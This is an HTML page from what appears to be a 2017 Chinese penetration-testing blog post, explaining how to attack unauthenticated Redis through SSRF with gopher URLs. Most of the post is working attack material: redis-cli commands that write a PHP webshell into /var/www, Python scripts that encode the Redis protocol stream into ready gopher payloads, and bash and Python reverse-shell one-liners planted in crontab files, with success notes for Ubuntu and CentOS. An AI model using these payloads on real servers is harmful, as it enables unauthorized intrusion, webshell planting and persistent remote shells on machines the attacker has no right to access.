@@ -1,0 +1,477 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>redis hacker | 😊#</title>
+  <meta name="author" content="JKme">
+  
+  <meta name="description" content="Orange在BH大会的paper上面这么说的:
+Protocols that are suitable to smuggle
+  HTTP based protocol:
+  	Elastic, CouchDB, Mongodb, Docker
+  
+  Text-based protocol:
+    FTP, SMTP, Redis, Memcached
+
+Ph在他https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html里面也提到过，redis的协议是简单的协议流，关于这一点可以查看redis的官方解释: https://redis.io/topics/protocol
+https://blog.chaitin.cn/gopher-attack-surfaces/在这篇文章里面提到使用gopher来攻击redis，使用的步骤是这样的：
+
+redis-server启动的时候监听6378端口 redis-server /etc/redis/redis.conf --port 6378
+运行socat -v tcp-listen:6379,fork tcp-connetc:localhost:6378
+然后再正常使用redis来攻击
+
+写shell相当于把6379的端口流量转发到6378，而redis-server监听的是6378端口，使用redis-server来写shell是这样的步骤:
+redis-cli -h 127.0.0.1 flushall
+redis-cli -h 127.0.0.1 config set dir &amp;#x2F;var&amp;#x2F;www
+redis-cli -h 127.0.0.1 config set dbfilename shell.php
+redis-cli -h 127.0.0.1 set webshell &amp;quot;&amp;lt;?php phpinfo();?&amp;gt;&amp;quot;
+redis-cli -h 127.0.0.1 save 
+然后得到的数据流如下：
+*1\r
+$8\r
+flushall\r
+*4\r
+$6\r
+config\r
+$3\r
+set\r
+$3\r
+dir\r
+$8\r
+&amp;#x2F;var&amp;#x2F;www\r
+*4\r
+$6\r
+config\r
+$3\r
+set\r
+$10\r
+dbfilename\r
+$9\r
+shell.php\r
+*3\r
+$3\r
+set\r
+$3\r
+web\r
+$18\r
+&amp;lt;?php phpinfo();?&amp;gt;\r
+*1\r
+$4\r
+save\r"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="redis hacker"/>
+  <meta property="og:site_name" content="😊#"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  <link rel="stylesheet" href="/css/prism-atom-dark.css" media="screen" type="text/css">
+    <link rel="stylesheet" href="/css/prism-line-numbers.css" media="screen" type="text/css">
+  <script src="/js/jquery-2.0.3.min.js"></script>
+<!--   <script src="/js/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+  <link rel="stylesheet" href="/css/highlight/styles/atom-one-dark.min.css" media="screen" type="text/css"> -->
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="😊#" type="application/atom+xml">
+</head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">😊#</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/project" title="All the categories.">
+			  <i class=""></i>Projects
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class="fa fa-rss"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> redis hacker</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <p>Orange在BH大会的paper上面这么说的:</p>
+<pre class="line-numbers language-none"><code class="language-none">Protocols that are suitable to smuggle
+  HTTP based protocol:
+  	Elastic, CouchDB, Mongodb, Docker
+  
+  Text-based protocol:
+    FTP, SMTP, Redis, Memcached<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Ph在他<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html">https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html</a>里面也提到过，redis的协议是简单的协议流，关于这一点可以查看redis的官方解释: <a target="_blank" rel="noopener" href="https://redis.io/topics/protocol">https://redis.io/topics/protocol</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.chaitin.cn/gopher-attack-surfaces/">https://blog.chaitin.cn/gopher-attack-surfaces/</a><br>在这篇文章里面提到使用gopher来攻击redis，使用的步骤是这样的：</p>
+<ul>
+<li>redis-server启动的时候监听6378端口 <code>redis-server /etc/redis/redis.conf --port 6378</code></li>
+<li>运行<code>socat -v tcp-listen:6379,fork tcp-connetc:localhost:6378</code></li>
+<li>然后再正常使用redis来攻击</li>
+</ul>
+<h2 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h2><p>相当于把6379的端口流量转发到6378，而redis-server监听的是6378端口，使用redis-server来写shell是这样的步骤:</p>
+<pre class="line-numbers language-none"><code class="language-none">redis-cli -h 127.0.0.1 flushall
+redis-cli -h 127.0.0.1 config set dir &#x2F;var&#x2F;www
+redis-cli -h 127.0.0.1 config set dbfilename shell.php
+redis-cli -h 127.0.0.1 set webshell &quot;&lt;?php phpinfo();?&gt;&quot;
+redis-cli -h 127.0.0.1 save <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>然后得到的数据流如下：</p>
+<pre class="line-numbers language-none"><code class="language-none">*1\r
+$8\r
+flushall\r
+*4\r
+$6\r
+config\r
+$3\r
+set\r
+$3\r
+dir\r
+$8\r
+&#x2F;var&#x2F;www\r
+*4\r
+$6\r
+config\r
+$3\r
+set\r
+$10\r
+dbfilename\r
+$9\r
+shell.php\r
+*3\r
+$3\r
+set\r
+$3\r
+web\r
+$18\r
+&lt;?php phpinfo();?&gt;\r
+*1\r
+$4\r
+save\r<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>参考joychou写cron的脚本转换，python转换脚本如下:</p>
+<pre class="line-numbers language-none"><code class="language-none">f &#x3D; open(&#39;&#x2F;xxxxx&#x2F;Desktop&#x2F;3.txt&#39;, &#39;r&#39;)
+s &#x3D; &#39;&#39;
+for line in f.readlines():
+	# if line[-3:-1] &#x3D;&#x3D; r&quot;\r&quot;:
+	# 	print line
+	# print line[-3:-1]
+	if line[-3:-1] &#x3D;&#x3D; r&quot;\r&quot;:
+		line &#x3D; line.replace(r&quot;\r&quot;, &quot;%0d%0a&quot;)
+		line &#x3D; line.replace(&quot;\n&quot;, &#39;&#39;)
+		s &#x3D; s + line
+print s.replace(&quot;$&quot;, &quot;%24&quot;)
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>如上的写shell数据流经过编码如下(注意php的shell那里，经过上面转换还是尖括号，两个尖括号和<code>;</code>要经过url编码，然后使用curl直接发送如下，我也不知道为啥<code>$</code>还要编码，知道的同学请告知，谢谢）:</p>
+<pre class="line-numbers language-none"><code class="language-none">curl -v &quot;gopher:&#x2F;&#x2F;127.0.0.1:6379&#x2F;_*1%0d%0a%248%0d%0aflushall%0d%0a*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%243%0d%0adir%0d%0a%248%0d%0a&#x2F;var&#x2F;www%0d%0a*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%2410%0d%0adbfilename%0d%0a%249%0d%0ashell.php%0d%0a*3%0d%0a%243%0d%0aset%0d%0a%243%0d%0aweb%0d%0a%2418%0d%0a%3C%3Fphp phpinfo()%3B%3F%3E%0d%0a*1%0d%0a%244%0d%0asave%0d%0a&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>然后上面的payload在存在ssrf的时候，使用发送之前要url编码一次，发送即可得到shell。</p>
+<pre class="line-numbers language-none"><code class="language-none">gopher%3A%2F%2F127.0.0.1%3A6378%2F_*1%250d%250a%25248%250d%250aflushall%250d%250a*4%250d%250a%25246%250d%250aconfig%250d%250a%25243%250d%250aset%250d%250a%25243%250d%250adir%250d%250a%25248%250d%250a%2Fvar%2Fwww%250d%250a*4%250d%250a%25246%250d%250aconfig%250d%250a%25243%250d%250aset%250d%250a%252410%250d%250adbfilename%250d%250a%25249%250d%250ashell.php%250d%250a*3%250d%250a%25243%250d%250aset%250d%250a%25243%250d%250aweb%250d%250a%252418%250d%250a%253C%253Fphp%20phpinfo()%253B%253F%253E%250d%250a*1%250d%250a%25244%250d%250asave%250d%250a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="写定时任务"><a href="#写定时任务" class="headerlink" title="写定时任务"></a>写定时任务</h3><p>测试环境：<br>ubuntu  14.04.5 LTS<br>centos  6.7</p>
+<p>直接crontab -e编辑:</p>
+<pre class="line-numbers language-none"><code class="language-none">*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2333 0&gt;&amp;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>在ubuntu下不会反弹成功，centos可以反弹成功。</p>
+<p>改为Python反弹:</p>
+<pre class="line-numbers language-none"><code class="language-none">*&#x2F;1 * * * * python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>ubuntu和Linux均反弹成功。</p>
+<ol start="3">
+<li>编辑/etc/crontab，使用上面两个payload，注意［这里定时任务需要加user］</li>
+</ol>
+<pre class="line-numbers language-none"><code class="language-none">*&#x2F;1 * * * * root  bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2333 0&gt;&amp;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>在ubuntu下，bash反弹失败，python反弹成功。<br>在CentOS下，两个均成功。</p>
+<ol start="4">
+<li>编辑/var/spool/cron/root文件，使用上面两个反弹shell:</li>
+</ol>
+<p>在Ubuntu下，两个均失败。<br>在CentOS下，两个均成功。</p>
+<ol start="5">
+<li>编辑/var/spool/cron/crontabs/root(Centos默认没有这个路径），所以这个是ubuntu测试：</li>
+</ol>
+<p>bash反弹失败<br>python反弹成功</p>
+<p>Centos的定式任务在<code>/var/spool/cron/root</code><br>Ubuntu定时任务<code>/var/spool/cron/crontabs/root</code></p>
+<p>所以如果redis里面写shell，<a target="_blank" rel="noopener" href="https://joychou.org/web/hackredis-enhanced-edition-script.html">https://joychou.org/web/hackredis-enhanced-edition-script.html</a>，由于使用redis写crontab的时候，创建的文件权限是644，ubuntu无法执行，所以ubuntu下使用redis写shell是无法成功的。</p>
+<p>写入/etc/crontab的时候，由于存在乱码，所以会导致ubuntu不能正确识别，导致定时任务失败。</p>
+<p>所以以上两点来看，ubuntu利用写文件执行crontab不会成功：</p>
+<ul>
+<li>如果写/etc/crontab，语法不识别</li>
+<li>如果写<code>/var/spool/cron/crontabs/root</code>，权限不是root，语法不识别。</li>
+</ul>
+<p>如果只能写文件，想反弹shell通用，比如redis的未授权访问（ubuntu这种情况下无解）：</p>
+<ol>
+<li>写/etc/crontab文件</li>
+<li>使用python反弹shell脚本</li>
+</ol>
+<p>如果可以执行命令，想反弹shell，比如docker remote api未授权访问：</p>
+<ol>
+<li>写当前用户下crontab或者写<code>/etc/crontab</code>也可以。</li>
+<li>使用python反弹shell脚本</li>
+</ol>
+<p>下面这个是从<a target="_blank" rel="noopener" href="https://joychou.org/web/phpssrf.html">https://joychou.org/web/phpssrf.html</a>这里搬来的代码，出来的结果，我这里发现需要对其中的<code>$</code>编码（另外说一句，这个<code>$</code>直接写在md之后，会改变文字的意思。貌似是个特殊字符。</p>
+<pre class="line-numbers language-none"><code class="language-none">#coding: utf-8
+#author: JoyChou
+import sys
+
+exp &#x3D; &#39;&#39;
+
+with open(&#39;&#x2F;Users&#x2F;xxx&#x2F;Desktop&#x2F;1.txt&#39;) as f:
+    for line in f.readlines():
+        if line[0] in &#39;&gt;&lt;+&#39;:
+            continue
+        # 判断倒数第2、3字符串是否为\r
+        elif line[-3:-1] &#x3D;&#x3D; r&#39;\r&#39;:
+            # 如果该行只有\r，将\r替换成%0a%0d%0a
+            if len(line) &#x3D;&#x3D; 3:
+                exp &#x3D; exp + &#39;%0a%0d%0a&#39;
+            else:
+                line &#x3D; line.replace(r&#39;\r&#39;, &#39;%0d%0a&#39;)
+                # 去掉最后的换行符
+                line &#x3D; line.replace(&#39;\n&#39;, &#39;&#39;)
+                exp &#x3D; exp + line
+        # 判断是否是空行，空行替换为%0a
+        elif line &#x3D;&#x3D; &#39;\x0a&#39;:
+            exp &#x3D; exp + &#39;%0a&#39;
+        else:
+            line &#x3D; line.replace(&#39;\n&#39;, &#39;&#39;)
+            exp &#x3D; exp + line
+print exp.replace(&#39;$&#39;, &#39;%24&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>攻击的时候时候，使用的是这样的exp:</p>
+<pre class="line-numbers language-none"><code class="language-none">config set dir &#x2F;var&#x2F;spool&#x2F;cron
+config set dbfilename root
+set www &quot;\n\n*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2333 0&gt;&amp;1\n\n&quot;
+save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>经过编码之后，得到的exp:</p>
+<pre class="line-numbers language-none"><code class="language-none">gopher:&#x2F;&#x2F;127.0.0.1:6379&#x2F;_*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%243%0d%0adir%0d%0a%2415%0d%0a&#x2F;var&#x2F;spool&#x2F;cron%0d%0a*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%2410%0d%0adbfilename%0d%0a%244%0d%0aroot%0d%0a*3%0d%0a%243%0d%0aset%0d%0a%243%0d%0awww%0d%0a%2455%0d%0a%0a%0a*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2333 0&gt;&amp;1%0a%0a%0d%0a*1%0d%0a%244%0d%0asave%0d%0a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>然后上面的再经过http编码即可攻击成功。</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.hugeserver.com/kb/install-redis-centos/">https://www.hugeserver.com/kb/install-redis-centos/</a></li>
+<li><a target="_blank" rel="noopener" href="https://joychou.org/web/phpssrf.html">https://joychou.org/web/phpssrf.html</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/write-webshell-via-redis-server.html">https://www.leavesongs.com/PENETRATION/write-webshell-via-redis-server.html</a></li>
+<li><a target="_blank" rel="noopener" href="http://vinc.top/2016/11/24/%E3%80%90ssrf%E3%80%91ssrfgopher%E6%90%9E%E5%AE%9A%E5%86%85%E7%BD%91%E6%9C%AA%E6%8E%88%E6%9D%83redis/">http://vinc.top/2016/11/24/%E3%80%90ssrf%E3%80%91ssrfgopher%E6%90%9E%E5%AE%9A%E5%86%85%E7%BD%91%E6%9C%AA%E6%8E%88%E6%9D%83redis/</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.chaitin.cn/gopher-attack-surfaces/">https://blog.chaitin.cn/gopher-attack-surfaces/</a></li>
+</ul>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2017/12/05/redis-crontab.html" class="leancloud-visitors view" data-flag-title="redis hacker">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2017/12/06/dns-rebinding.html" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2017/11/28/sql-bypass-unknown.html" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2017-12-05 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/Pentest/">Pentest<span>42</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%86%99shell"><span class="toc-article-text">写shell</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%86%99%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="toc-article-text">写定时任务</span></a></li></ol></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2022 JKme's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
